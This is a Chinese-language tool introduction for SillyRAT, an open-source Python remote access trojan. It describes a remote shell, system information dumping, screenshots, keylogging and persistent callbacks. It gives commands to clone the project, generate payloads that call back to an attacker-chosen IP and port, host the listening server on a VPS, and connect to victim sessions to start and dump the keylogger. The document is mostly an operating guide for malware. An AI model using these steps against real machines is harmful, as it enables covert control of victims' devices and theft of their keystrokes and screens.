![](https://image.3001.net/images/20211216/1639637693_61bae2bd4ce9036ffb178.png!small)

## 关于SillyRAT

SillyRAT是一款功能强大的跨平台RAT工具，该工具基于纯Python开发，并且引入了多种实用功能。SillyRAT的服务器端和客户端（目标设备）运行需要广大研究人员提供运行命令和参数。除此之外，广大研究人员还可以使用“generate”命令来使用pyinstaller模块编译实际的Payload代码。因此，我们需要在特定的平台上生成对应平台的Payload文件。除此之外，SillyRAT也是一款开源工具，因此我们还可以直接获到SillyRAT的源代码。

![](https://image.3001.net/images/20211216/1639637701_61bae2c50d7fc762671dc.png!small)

## 功能介绍

  * 内置Shell以实现命令执行；
  * 转储目标系统信息，包括驱动器信息和内存信息等；
  * 屏幕截图模块，捕捉客户端设备屏幕的截图；
  * 链接循环（与服务器建立持久连接）；
  * 使用Base64编码；
  * 纯Python开发；
  * 跨平台特性（Windows、Linux和macOS）；
  * 源代码文件中包含测试项目；
  * Python 3支持；
  * 隐蔽执行（即将上线）；
  * 数据加密（即将上线）；
  * 存储会话信息（即将上线）；
  * 客户端上线后推送消息通知（即将上线）；

## 工具安装

该工具已在Parrot OS（Python 3.8）环境上进行过完整测试。广大研究人员可以使用下列命令将该项目源码克隆至本地，并安装相关的依赖组件：

    
    
    $ git clone https://github.com/hash3liZer/SillyRAT.git
    
    $ cd SillyRAT/
    
    $ pip3 install -r requirements.txt

## 工具使用

### 生成Payload

我们可以通过下列两种方式获取Payload文件：

  * 源文件；
  * 编译文件；

针对所有操作系统平台的源文件都是一致的，因此我们可以直接在其中一个平台上生成一个Payload，并将其用于其他平台设备上。获取源文件的命令如下：

    
    
    $ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source

编译版本则针对的是不同的操作系统平台。比如说，你在Windows平台上编译生成的.exe文件就无法适用于Linux平台了，只能适用于Windows平台。该工具目前仍处于测试阶段，因此可能会出现报错等问题。

生成针对Linux平台的编译版本命令如下：

    
    
    $ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer

![](https://image.3001.net/images/20211216/1639637733_61bae2e5caac23300d3d3.png!small)

注：我们需要将上述命令中的参数替换成自己的IP地址和额端口号。

### 服务器运行

服务器必须运行在Linux系统上，你可以选择购买一台V*P*S或云服务器。注意，服务器不会存储任何的会话信息。因此，一旦服务器应用终止运行，所有的进程信息都将会丢失。服务器运行命令如下：

    
    
    $ python3 sillyrat.py bind --address 0.0.0.0 --port 2999

### 连接

我们可以使用“sessions”命令查看所有的连接信息：

    
    
    $ sessions

![](https://image.3001.net/images/20211216/1639637783_61bae317289a0e7a2fe32.png!small)

我们还可以使用“connect”命令来跟目标会话进行连接，并启动执行下列可用命令：

    
    
    $ connect ID
    
    $ keylogger on
    
    $ keylogger dump
    
    $ screenshot

![](https://image.3001.net/images/20211216/1639637811_61bae33344aa730d2e257.png!small)

### 帮助信息

获取可用命令列表：

    
    
    $ help

获取指定命令的帮助信息：

    
    
    $ help COMMAND

## 项目地址

 **SillyRAT：** 【[ _GitHub传送门_](https://github.com/hash3liZer/SillyRAT)】

